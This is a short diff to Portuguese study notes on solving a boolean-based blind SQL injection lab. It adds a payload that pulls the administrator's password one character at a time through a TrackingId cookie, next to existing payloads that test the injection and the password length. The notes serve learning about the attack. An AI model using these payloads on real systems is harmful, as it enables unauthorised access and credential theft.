@@ -7,3 +7,5 @@ description: Resolvendo a query blind em boolean based
 <mark style="color:yellow;">Cookie: TrackingId=IwFid1TZfsjh5UAO</mark><mark style="color:red;">' AND '1' = '1</mark>   (Quando colocado o aspas e and
 
 <mark style="color:green;">' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>=20)='a</mark>
+
+<mark style="background-color:blue;">' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator') = 'a</mark>
